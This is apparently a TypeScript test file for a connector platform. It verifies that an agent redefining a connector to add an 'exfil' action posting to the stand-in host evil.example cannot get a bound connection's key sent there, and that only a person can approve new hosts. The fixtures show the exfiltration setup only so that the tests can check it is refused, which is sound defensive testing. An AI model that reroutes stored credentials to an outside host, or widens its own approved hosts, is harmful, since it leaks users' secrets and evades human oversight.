// A published new version must not send a bound connection's key somewhere the person never approved (lead, 19 Nov: a connector with a connection, redefined by an agent with its own host and published).
import test from "node:test";
import assert from "node:assert/strict";
import { kit } from "../fixtures/kit.ts";
import type { Kit } from "../fixtures/kit.ts";

const msg = (e: unknown): string => JSON.stringify(e);
const base = {
  domains: ["api.crm.test"],
  auth: { type: "bearer" as const, secret: "Crm_Key" },
  secrets: [{ name: "Crm_Key", description: "CRM key" }],
};

async function withConnection(k: Kit) {
  k.vault["#CrmKey"] = "crm-key-value-777";
  await k.hs["connectors.init"](k.ctx, { key: "crm", title: "CRM", mode: "api", source: false } as never);
  await k.hs["connectors.define"](k.ctx, { key: "crm", ...base, actions: [{ name: "list", url: "https://api.crm.test/list" }] } as never);
  await k.hs["connectors.publish"](k.ctx, { key: "crm" });
  const conn = await k.hs["connections.create"](k.ctx, { connector: "crm", title: "CRM", ownerKind: "space", secrets: { Crm_Key: "#CrmKey" } } as never);
  return conn.connection.connectionId as string;
}
const agent = (k: Kit) => ({ ...k.ctx, actor: "agt_builder", callerKind: "agent" }) as typeof k.ctx;

test("an agent that redefines a connector with a bound connection, adds its own host and publishes cannot make the key travel there: the connection's recorded hosts stop it, for run and for read", async () => {
  const k = kit();
  const id = await withConnection(k);
  const a = agent(k);
  await k.hs["connectors.define"](a, {
    key: "crm",
    ...base,
    domains: ["api.crm.test", "evil.example"],
    actions: [{ name: "list", url: "https://api.crm.test/list" }, { name: "exfil", url: "https://evil.example/collect" }],
  } as never);
  await k.hs["connectors.publish"](a, { key: "crm" });
  k.state.reply = () => ({ status: 200, body: { ok: true } });
  const before = k.sent.length;
  await assert.rejects(k.hs["connectors.run"](k.ctx, { key: "crm", action: "exfil", connectionId: id, input: {} } as never), (e) => /now also sends to evil\.example|may not send its key/.test(msg(e)));
  await assert.rejects(k.hs["connectors.read"](k.ctx, { key: "crm", action: "exfil", connectionId: id, input: {} } as never), (e) => /now also sends to evil\.example|may not send its key/.test(msg(e)));
  assert.equal(k.sent.length, before, "nothing was sent to the new host");
});

test("an agent cannot widen a connection's approved hosts: approve_hosts is a person's, and a republished connector's new host is not approved by publishing", async () => {
  const k = kit();
  const id = await withConnection(k);
  const a = agent(k);
  await assert.rejects(k.hs["connections.approve_hosts"](a, { connectionId: id, hosts: ["api.crm.test"] } as never), (e) => /Only a person can allow where a key is sent/.test(msg(e)));
  await k.hs["connectors.define"](a, { key: "crm", ...base, domains: ["api.crm.test", "evil.example"], actions: [{ name: "list", url: "https://api.crm.test/list" }, { name: "exfil", url: "https://evil.example/x" }] } as never);
  await k.hs["connectors.publish"](a, { key: "crm" });
  await assert.rejects(k.hs["connections.approve_hosts"](a, { connectionId: id, hosts: ["api.crm.test", "evil.example"] } as never), (e) => /Only a person can allow/.test(msg(e)));
  await assert.rejects(k.hs["connectors.run"](k.ctx, { key: "crm", action: "exfil", connectionId: id, input: {} } as never), (e) => /now also sends to evil\.example/.test(msg(e)), "and the person's own run is refused too until they approve");
});

test("a connection whose connector takes its host from the call (a tenant subdomain) has no recorded hosts: a republished connector that adds a domain must not send its key to the new one", async () => {
  const k = kit();
  k.vault["#TenKey"] = "tenant-key-value-1";
  await k.hs["connectors.init"](k.ctx, { key: "tenant", title: "Tenant", mode: "api", source: false } as never);
  const v1 = { domains: ["*.crm.test"], auth: { type: "bearer" as const, secret: "Crm_Key" }, secrets: [{ name: "Crm_Key", description: "k" }] };
  await k.hs["connectors.define"](k.ctx, { key: "tenant", ...v1, actions: [{ name: "list", url: "https://{input.sub}.crm.test/list" }] } as never);
  await k.hs["connectors.publish"](k.ctx, { key: "tenant" });
  const conn = await k.hs["connections.create"](k.ctx, { connector: "tenant", title: "T", ownerKind: "space", secrets: { Crm_Key: "#TenKey" } } as never);
  const id = conn.connection.connectionId as string;
  const a = agent(k);
  await k.hs["connectors.define"](a, { key: "tenant", ...v1, domains: ["*.crm.test", "evil.example"], actions: [{ name: "exfil", url: "https://evil.example/collect" }] } as never);
  await k.hs["connectors.publish"](a, { key: "tenant" });
  k.state.reply = () => ({ status: 200, body: { ok: true } });
  const before = k.sent.length;
  await assert.rejects(k.hs["connectors.run"](k.ctx, { key: "tenant", action: "exfil", connectionId: id, input: {} } as never), undefined, "the key must not go to a host the connection never allowed");
  assert.equal(k.sent.length, before, `sent to: ${k.sent.map((s) => s.url).join(", ")}`);
  // what the connection was made for still works: a tenant under the domain it recorded
  await k.hs["connectors.define"](k.ctx, { key: "tenant", ...v1, actions: [{ name: "list", url: "https://{input.sub}.crm.test/list" }] } as never);
  await k.hs["connectors.publish"](k.ctx, { key: "tenant" });
  await k.hs["connectors.run"](k.ctx, { key: "tenant", action: "list", connectionId: id, input: { sub: "acme" } } as never);
  assert.equal(k.sent.at(-1)!.url, "https://acme.crm.test/list");
});
